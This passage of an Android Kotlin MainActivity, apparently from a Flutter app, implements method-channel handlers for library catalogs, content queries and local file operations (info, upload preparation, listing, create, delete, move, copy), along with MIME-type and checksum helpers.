                val catalogsData = remoteLibraryManager.getLibraryCatalogs()
                
                withContext(Dispatchers.Main) {
                    result.success(catalogsData.toString())
                }
                Log.i("MainActivity", "Library catalogs retrieval completed successfully.")
                
            } catch (securityEx: SecurityException) {
                Log.e("MainActivity", "Security error during catalogs retrieval", securityEx)
                withContext(Dispatchers.Main) {
                    result.error("CATALOGS_RESTRICTED", "Library catalogs access restricted", securityEx.message)
                }
            } catch (generalEx: Exception) {
                Log.e("MainActivity", "General error during catalogs retrieval", generalEx)
                withContext(Dispatchers.Main) {
                    result.error("CATALOGS_ERROR", "Failed to retrieve library catalogs", generalEx.message)
                }
            }
        }
    }
    
    private fun handleQueryContentIndex(result: MethodChannel.Result, searchQuery: String, searchPath: String?, contentFilter: String?) {
        Log.d("MainActivity", "Handling content index query: '$searchQuery' in $searchPath (filter: $contentFilter)")
        
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val queryData = remoteLibraryManager.queryContentIndex(searchQuery, searchPath, contentFilter)
                
                withContext(Dispatchers.Main) {
                    result.success(queryData.toString())
                }
                Log.i("MainActivity", "Content index query completed successfully.")
                
            } catch (securityEx: SecurityException) {
                Log.e("MainActivity", "Security error during content query", securityEx)
                withContext(Dispatchers.Main) {
                    result.error("QUERY_RESTRICTED", "Content query access restricted", securityEx.message)
                }
            } catch (generalEx: Exception) {
                Log.e("MainActivity", "General error during content query", generalEx)
                withContext(Dispatchers.Main) {
                    result.error("QUERY_ERROR", "Failed to query content index", generalEx.message)
                }
            }
        }
    }
    
    private fun handleGetFileInfo(result: MethodChannel.Result, filePath: String) {
        Log.d("MainActivity", "Handling get file info: $filePath")
        
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val file = File(filePath)
                val fileInfo = JSONObject().apply {
                    put("status", "success")
                    put("data", JSONObject().apply {
                        put("path", filePath)
                        put("exists", file.exists())
                        put("name", file.name)
                        put("isDirectory", file.isDirectory)
                        put("isFile", file.isFile)
                        put("size", if (file.exists()) file.length() else 0)
                        put("lastModified", if (file.exists()) file.lastModified() else 0)
                        put("canRead", file.canRead())
                        put("canWrite", file.canWrite())
                        put("isHidden", file.isHidden)
                        put("parent", file.parent ?: "")
                        if (file.isFile) {
                            put("extension", file.extension)
                            put("mimeType", getMimeType(file.extension))
                        }
                    })
                    put("timestamp", System.currentTimeMillis())
                }
                
                withContext(Dispatchers.Main) {
                    result.success(fileInfo.toString())
                }
                Log.i("MainActivity", "File info retrieval completed successfully.")
                
            } catch (securityEx: SecurityException) {
                Log.e("MainActivity", "Security error during file info retrieval", securityEx)
                withContext(Dispatchers.Main) {
                    result.error("ACCESS_DENIED", "File access denied", securityEx.message)
                }
            } catch (generalEx: Exception) {
                Log.e("MainActivity", "General error during file info retrieval", generalEx)
                withContext(Dispatchers.Main) {
                    result.error("FILE_INFO_ERROR", "Failed to get file info", generalEx.message)
                }
            }
        }
    }
    
    private fun handleFileUpload(result: MethodChannel.Result, filePath: String, uploadType: String) {
        Log.d("MainActivity", "Handling file upload: $filePath (type: $uploadType)")
        
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val file = File(filePath)
                if (!file.exists() || !file.canRead()) {
                    withContext(Dispatchers.Main) {
                        result.error("FILE_NOT_FOUND", "File not found or not readable: $filePath", null)
                    }
                    return@launch
                }
                
                // Check file size limits
                val maxSize = 50 * 1024 * 1024L // 50MB
                if (file.length() > maxSize) {
                    withContext(Dispatchers.Main) {
                        result.error("FILE_TOO_LARGE", "File size exceeds ${maxSize / (1024 * 1024)}MB limit", null)
                    }
                    return@launch
                }
                
                val uploadData = JSONObject().apply {
                    put("status", "success")
                    put("data", JSONObject().apply {
                        put("filePath", filePath)
                        put("fileName", file.name)
                        put("fileSize", file.length())
                        put("uploadType", uploadType)
                        put("mimeType", getMimeType(file.extension))
                        put("checksum", calculateFileChecksum(file))
                        put("uploadReady", true)
                    })
                    put("timestamp", System.currentTimeMillis())
                }
                
                withContext(Dispatchers.Main) {
                    result.success(uploadData.toString())
                }
                Log.i("MainActivity", "File upload preparation completed successfully.")
                
            } catch (securityEx: SecurityException) {
                Log.e("MainActivity", "Security error during file upload", securityEx)
                withContext(Dispatchers.Main) {
                    result.error("UPLOAD_DENIED", "File upload access denied", securityEx.message)
                }
            } catch (generalEx: Exception) {
                Log.e("MainActivity", "General error during file upload", generalEx)
                withContext(Dispatchers.Main) {
                    result.error("UPLOAD_ERROR", "Failed to upload file", generalEx.message)
                }
            }
        }
    }
    
    private fun handleFileDownload(result: MethodChannel.Result, remoteUrl: String, localPath: String) {
        Log.d("MainActivity", "Handling file download: $remoteUrl to $localPath")
        
        CoroutineScope(Dispatchers.IO).launch {
            try {
                // This is a placeholder for actual download implementation
                val downloadData = JSONObject().apply {
                    put("status", "success")
                    put("data", JSONObject().apply {
                        put("remoteUrl", remoteUrl)
                        put("localPath", localPath)
                        put("downloadStarted", true)
                        put("estimatedSize", 0)
                    })
                    put("timestamp", System.currentTimeMillis())
                }
                
                withContext(Dispatchers.Main) {
                    result.success(downloadData.toString())
                }
                Log.i("MainActivity", "File download initiated successfully.")
                
            } catch (generalEx: Exception) {
                Log.e("MainActivity", "Error during file download", generalEx)
                withContext(Dispatchers.Main) {
                    result.error("DOWNLOAD_ERROR", "Failed to download file", generalEx.message)
                }
            }
        }
    }
    
    private fun handleListDirectory(result: MethodChannel.Result, directoryPath: String, includeHidden: Boolean) {
        Log.d("MainActivity", "Handling list directory: $directoryPath (include hidden: $includeHidden)")
        
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val directory = File(directoryPath)
                if (!directory.exists() || !directory.isDirectory) {
                    withContext(Dispatchers.Main) {
                        result.error("DIRECTORY_NOT_FOUND", "Directory not found: $directoryPath", null)
                    }
                    return@launch
                }
                
                val files = directory.listFiles()?.filter { file ->
                    includeHidden || !file.isHidden
                } ?: emptyList()
                
                val filesList = JSONArray()
                files.forEach { file ->
                    val fileInfo = JSONObject().apply {
                        put("name", file.name)
                        put("path", file.absolutePath)
                        put("type", if (file.isDirectory) "directory" else "file")
                        put("size", if (file.isFile) file.length() else 0)
                        put("lastModified", file.lastModified())
                        put("canRead", file.canRead())
                        put("canWrite", file.canWrite())
                        put("isHidden", file.isHidden)
                        if (file.isFile) {
                            put("extension", file.extension)
                            put("mimeType", getMimeType(file.extension))
                        }
                    }
                    filesList.put(fileInfo)
                }
                
                val directoryData = JSONObject().apply {
                    put("status", "success")
                    put("data", JSONObject().apply {
                        put("path", directoryPath)
                        put("files", filesList)
                        put("totalCount", files.size)
                        put("includeHidden", includeHidden)
                    })
                    put("timestamp", System.currentTimeMillis())
                }
                
                withContext(Dispatchers.Main) {
                    result.success(directoryData.toString())
                }
                Log.i("MainActivity", "Directory listing completed successfully.")
                
            } catch (securityEx: SecurityException) {
                Log.e("MainActivity", "Security error during directory listing", securityEx)
                withContext(Dispatchers.Main) {
                    result.error("ACCESS_DENIED", "Directory access denied", securityEx.message)
                }
            } catch (generalEx: Exception) {
                Log.e("MainActivity", "General error during directory listing", generalEx)
                withContext(Dispatchers.Main) {
                    result.error("LISTING_ERROR", "Failed to list directory", generalEx.message)
                }
            }
        }
    }
    
    private fun handleCreateDirectory(result: MethodChannel.Result, directoryPath: String) {
        Log.d("MainActivity", "Handling create directory: $directoryPath")
        
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val directory = File(directoryPath)
                val created = directory.mkdirs()
                
                val createData = JSONObject().apply {
                    put("status", if (created || directory.exists()) "success" else "failed")
                    put("data", JSONObject().apply {
                        put("path", directoryPath)
                        put("created", created)
                        put("exists", directory.exists())
                    })
                    put("timestamp", System.currentTimeMillis())
                }
                
                withContext(Dispatchers.Main) {
                    result.success(createData.toString())
                }
                Log.i("MainActivity", "Directory creation completed.")
                
            } catch (securityEx: SecurityException) {
                Log.e("MainActivity", "Security error during directory creation", securityEx)
                withContext(Dispatchers.Main) {
                    result.error("ACCESS_DENIED", "Directory creation access denied", securityEx.message)
                }
            } catch (generalEx: Exception) {
                Log.e("MainActivity", "General error during directory creation", generalEx)
                withContext(Dispatchers.Main) {
                    result.error("CREATE_ERROR", "Failed to create directory", generalEx.message)
                }
            }
        }
    }
    
    private fun handleDeleteFile(result: MethodChannel.Result, filePath: String) {
        Log.d("MainActivity", "Handling delete file: $filePath")
        
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val file = File(filePath)
                val deleted = if (file.exists()) {
                    if (file.isDirectory) {
                        file.deleteRecursively()
                    } else {
                        file.delete()
                    }
                } else {
                    false
                }
                
                val deleteData = JSONObject().apply {
                    put("status", if (deleted) "success" else "failed")
                    put("data", JSONObject().apply {
                        put("path", filePath)
                        put("deleted", deleted)
                        put("existed", file.exists())
                    })
                    put("timestamp", System.currentTimeMillis())
                }
                
                withContext(Dispatchers.Main) {
                    result.success(deleteData.toString())
                }
                Log.i("MainActivity", "File deletion completed.")
                
            } catch (securityEx: SecurityException) {
                Log.e("MainActivity", "Security error during file deletion", securityEx)
                withContext(Dispatchers.Main) {
                    result.error("ACCESS_DENIED", "File deletion access denied", securityEx.message)
                }
            } catch (generalEx: Exception) {
                Log.e("MainActivity", "General error during file deletion", generalEx)
                withContext(Dispatchers.Main) {
                    result.error("DELETE_ERROR", "Failed to delete file", generalEx.message)
                }
            }
        }
    }
    
    private fun handleMoveFile(result: MethodChannel.Result, sourcePath: String, destinationPath: String) {
        Log.d("MainActivity", "Handling move file: $sourcePath to $destinationPath")
        
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val sourceFile = File(sourcePath)
                val destinationFile = File(destinationPath)
                
                val moved = if (sourceFile.exists()) {
                    sourceFile.renameTo(destinationFile)
                } else {
                    false
                }
                
                val moveData = JSONObject().apply {
                    put("status", if (moved) "success" else "failed")
                    put("data", JSONObject().apply {
                        put("sourcePath", sourcePath)
                        put("destinationPath", destinationPath)
                        put("moved", moved)
                        put("sourceExists", sourceFile.exists())
                        put("destinationExists", destinationFile.exists())
                    })
                    put("timestamp", System.currentTimeMillis())
                }
                
                withContext(Dispatchers.Main) {
                    result.success(moveData.toString())
                }
                Log.i("MainActivity", "File move completed.")
                
            } catch (securityEx: SecurityException) {
                Log.e("MainActivity", "Security error during file move", securityEx)
                withContext(Dispatchers.Main) {
                    result.error("ACCESS_DENIED", "File move access denied", securityEx.message)
                }
            } catch (generalEx: Exception) {
                Log.e("MainActivity", "General error during file move", generalEx)
                withContext(Dispatchers.Main) {
                    result.error("MOVE_ERROR", "Failed to move file", generalEx.message)
                }
            }
        }
    }
    
    private fun handleCopyFile(result: MethodChannel.Result, sourcePath: String, destinationPath: String) {
        Log.d("MainActivity", "Handling copy file: $sourcePath to $destinationPath")
        
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val sourceFile = File(sourcePath)
                val destinationFile = File(destinationPath)
                
                val copied = if (sourceFile.exists() && sourceFile.isFile) {
                    try {
                        sourceFile.copyTo(destinationFile, overwrite = true)
                        true
                    } catch (e: Exception) {
                        false
                    }
                } else {
                    false
                }
                
                val copyData = JSONObject().apply {
                    put("status", if (copied) "success" else "failed")
                    put("data", JSONObject().apply {
                        put("sourcePath", sourcePath)
                        put("destinationPath", destinationPath)
                        put("copied", copied)
                        put("sourceExists", sourceFile.exists())
                        put("destinationExists", destinationFile.exists())
                        if (copied) {
                            put("destinationSize", destinationFile.length())
                        }
                    })
                    put("timestamp", System.currentTimeMillis())
                }
                
                withContext(Dispatchers.Main) {
                    result.success(copyData.toString())
                }
                Log.i("MainActivity", "File copy completed.")
                
            } catch (securityEx: SecurityException) {
                Log.e("MainActivity", "Security error during file copy", securityEx)
                withContext(Dispatchers.Main) {
                    result.error("ACCESS_DENIED", "File copy access denied", securityEx.message)
                }
            } catch (generalEx: Exception) {
                Log.e("MainActivity", "General error during file copy", generalEx)
                withContext(Dispatchers.Main) {
                    result.error("COPY_ERROR", "Failed to copy file", generalEx.message)
                }
            }
        }
    }
    
    // ==================== HELPER METHODS ====================
    
    private fun getMimeType(extension: String): String {
        return when (extension.lowercase()) {
            "txt" -> "text/plain"
            "pdf" -> "application/pdf"
            "doc" -> "application/msword"
            "docx" -> "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
            "jpg", "jpeg" -> "image/jpeg"
            "png" -> "image/png"
            "gif" -> "image/gif"
            "mp3" -> "audio/mpeg"
            "mp4" -> "video/mp4"
            "zip" -> "application/zip"
            "json" -> "application/json"
            "xml" -> "application/xml"
            else -> "application/octet-stream"
        }
    }
    
    private fun calculateFileChecksum(file: File): String {
        return try {
            val bytes = file.readBytes()
            val digest = java.security.MessageDigest.getInstance("MD5")
            val hash = digest.digest(bytes)
            hash.joinToString("") { "%02x".format(it) }
        } catch (e: Exception) {
            "checksum_unavailable"
        }
    }

    override fun onDestroy() {
        Log.d("MainActivity", "onDestroy called. Cleaning up all resources.")
        fixedRecordingManager.cleanup()
        liveStreamingManager.cleanup()
        super.onDestroy()
    }
}